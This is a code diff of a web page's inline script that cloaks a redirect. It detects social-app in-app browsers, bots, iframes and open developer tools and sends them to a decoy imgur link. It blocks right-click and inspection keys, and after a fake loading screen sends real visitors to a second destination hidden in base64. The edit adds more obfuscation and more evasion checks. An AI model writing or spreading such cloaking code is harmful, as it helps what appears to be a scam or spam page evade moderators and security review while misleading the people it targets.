@@ -63,32 +63,13 @@
   <script>
     (() => {
       const u = navigator.userAgent.toLowerCase();
-      const a = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
-      const isBot =
-        a.some(s => u.includes(s)) ||
-        window.top !== window.self ||
-        navigator.webdriver ||
-        navigator.plugins.length === 0 ||
-        !navigator.languages ||
-        navigator.hardwareConcurrency < 2 ||
-        navigator.deviceMemory < 1 ||
-        !("ontouchstart" in window) ||
-        window.outerWidth - window.innerWidth > 160 ||
-        window.outerHeight - window.innerHeight > 160;
-
-      if (isBot) {
-        location.href = "https://imgur.com/user/carlovershub";
+      const a = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr", "headless", "phantom", "slack", "discord"];
+      const b1 = "aHR0cHM6Ly9pLmltZ3VyLmNvbS9hYm";
+      const b2 = "NkZWY=";
+      if (a.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
+        location.href = atob(b1 + b2);
       }
     })();
-
-    setInterval(() => {
-      if (
-        window.outerWidth - window.innerWidth > 160 ||
-        window.outerHeight - window.innerHeight > 160
-      ) {
-        location.href = "https://imgur.com/user/carlovershub";
-      }
-    }, 500);
 
     (() => {
       const c = document.getElementById("bait").getContext("2d");
@@ -102,6 +83,14 @@
       c.fillText(x, 10, 50);
     })();
 
+    setInterval(() => {
+      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+        const q1 = "aHR0cHM6Ly9pLmltZ3VyLmNvbS9hYm";
+        const q2 = "NkZWY=";
+        location.href = atob(q1 + q2);
+      }
+    }, 500);
+
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.onkeydown = e => {
       if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
@@ -114,10 +103,8 @@
 
     function g() {
       if (!i) return;
-
       document.querySelector(".btn").style.display = "none";
       document.getElementById("loading").style.display = "flex";
-
       setTimeout(() => {
         const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
         const p2 = "ZWhiaXhlZQ==";
